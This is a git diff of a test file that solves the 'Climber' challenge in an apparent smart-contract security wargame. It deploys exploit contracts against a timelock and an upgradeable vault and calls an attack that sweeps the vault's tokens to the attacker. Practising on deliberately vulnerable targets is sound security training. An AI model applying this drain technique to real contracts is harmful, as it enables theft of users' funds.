@@ -72,21 +72,25 @@ describe("[Challenge] Climber", function () {
     // Update the delay to be 0
     // Schedule the schedule action
 
-    this.upgradedVault = await ethers.getContractFactory(
-      "UpgradedVault",
-      attacker
-    );
+    const targetTimelock = this.timelock.connect(attacker);
+    const targetVault = this.vault.connect(attacker);
 
-    this.attackerContract = await (
+    const exploitVault = await (
+      await ethers.getContractFactory("ExploitVault", attacker)
+    ).deploy();
+
+    const exploitClimber = await (
       await ethers.getContractFactory("ExploitClimber", attacker)
-    ).deploy(this.timelock.address, this.vault.address, attacker.address);
-
-    await this.attackerContract.connect(attacker).attack();
-    const compromisedVault = await upgrades.upgradeProxy(
-      this.vault.address,
-      this.upgradedVault
+    ).deploy(
+      targetTimelock.address,
+      targetVault.address,
+      exploitVault.address,
+      attacker.address,
+      this.token.address
     );
-    await compromisedVault.connect(attacker).sweepFunds(this.token.address);
+
+    //Attack: call execute with our 4 call, sweep the funds, and send them our way
+    await exploitClimber.attack();
   });
 
   after(async function () {
